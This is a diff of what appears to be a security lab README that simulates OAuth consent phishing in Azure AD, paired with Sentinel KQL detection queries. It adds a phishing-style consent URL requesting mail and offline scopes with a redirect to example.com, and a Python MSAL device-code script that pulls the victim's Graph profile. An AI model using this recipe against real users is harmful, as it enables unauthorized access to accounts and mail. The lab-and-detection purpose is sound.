@@ -40,25 +40,57 @@ This project demonstrates an OAuth consent phishing attack simulation using a mu
 
 1) App Registration: Registered a multi-tenant app in Azure AD with public client flow enabled.
 
-2) Generated Consent URL: Shared phishing-style URL to trigger consent screen.
+<img width="1035" height="419" alt="image" src="https://github.com/user-attachments/assets/191599d8-aa88-40a5-a7ef-d67cabe486bc" />
 
-3) Consent: User accepted the app’s request for User.Read and offline_access scopes.
+Redirects: 
 
-4) Access Token Retrieval: Used MSAL in Python to perform device code login.
-
-5) API Call: Successfully queried Microsoft Graph API for the signed-in user's profile data.
-
-6) Log Collection: Verified consent grant and app sign-ins using KQL queries in Sentinel.
+<img width="1232" height="518" alt="image" src="https://github.com/user-attachments/assets/87819af4-9232-4d93-a3a7-084b1e0de59e" />
 
 ---
 
-## Sample Graph API Output
+2) Generated Consent URL: Shared phishing-style URL to trigger consent screen.
+
+https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
+client_id=<348ed938-8c24-4cb4-8dff-1b5ed4e31778>
+&response_type=code
+&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
+&response_mode=query
+&scope=Mail.Read offline_access User.Read
+&state=attack123
+
+---
+
+3) Consent: User accepted the app’s request for User.Read and offline_access scopes.
+
+<img width="966" height="1002" alt="image" src="https://github.com/user-attachments/assets/7eb88ce3-4923-4ac5-bf6a-e3b28ecc5469" />
+
+Once the user clicks agree they will be redirected to a page such as this:
+
+<img width="2034" height="1020" alt="image" src="https://github.com/user-attachments/assets/460c23ea-c15c-4dc7-af68-0417e143e171" />
+
+---
+
+4) Access Token Retrieval: Used MSAL in Python to perform device code login.
+
+Prompt requesting to sign into app:
+
+<img width="1202" height="782" alt="image" src="https://github.com/user-attachments/assets/c1844797-29a3-481e-9f2d-5ca6becfe20e" />
+
+Once the user signs into the app they will see a notification such as this:
+
+<img width="2466" height="1102" alt="image" src="https://github.com/user-attachments/assets/534412a3-a853-4678-b157-d16ce920a504" />
+
+---
+
+5) API Call: Successfully queried Microsoft Graph API for the signed-in user's profile data.
+
+- Sample Graph API Output
 
 Display Name: e3cf69dbacbbce89aa76d8f5acef15ea51a051580fa22288481eedda249514de
 UPN: e3cf69dbacbbce89aa76d8f5acef15ea51a051580fa22288481eedda249514de@lognpacific.com
 ID: 5512a2c3-93f5-4e29-baf6-fc58c2710f19
 
----
+6) Log Collection: Verified consent grant and app sign-ins using KQL queries in Sentinel.
 
 ## KQL Detection Queries Used
 
@@ -87,6 +119,51 @@ SigninLogs
 ```
 
 <img width="1734" height="756" alt="image" src="https://github.com/user-attachments/assets/5e6b6284-6d64-47c0-ba04-95f5039398af" />
+
+---
+
+## This Python script represents post-consent activity performed by an attacker. The victim only sees the Microsoft OAuth consent prompt in their browser. No scripts or malware are needed for this attack — just social engineering and permission abuse.
+
+
+```Python
+import msal, requests
+
+client_id = "348ed938-8c24-4cb4-8dff-1b5ed4e31778"
+authority = "https://login.microsoftonline.com/common"
+scopes = ["User.Read", "offline_access"]
+
+app = msal.PublicClientApplication(client_id, authority=authority)
+flow = app.initiate_device_flow(scopes=scopes)
+
+if "user_code" not in flow:
+    raise ValueError("Failed to start device code flow")
+
+print("\nTo authenticate:")
+print(flow["message"])
+
+result = app.acquire_token_by_device_flow(flow)
+
+if "access_token" in result:
+    print("\n✅ Authenticated successfully.")
+    token = result["access_token"]
+    r = requests.get(
+        "https://graph.microsoft.com/v1.0/me",
+        headers={"Authorization": f"Bearer {token}"}
+    )
+    user = r.json()
+    print("\n👤 User Info:")
+    print(f"Display Name: {user.get('displayName')}")
+    print(f"UPN: {user.get('userPrincipalName')}")
+    print(f"ID: {user.get('id')}")
+else:
+    print("\n❌ Failed to authenticate:")
+    print(result.get("error_description"))
+```
+---
+
+After the above script is ran the output will be what is shown below. Allowing me access to the end user: 
+
+<img width="2040" height="152" alt="image" src="https://github.com/user-attachments/assets/c1891655-fe94-4308-84ac-acc694ff405d" /> 
 
 ---
 ## MITRE ATT&CK Mapping
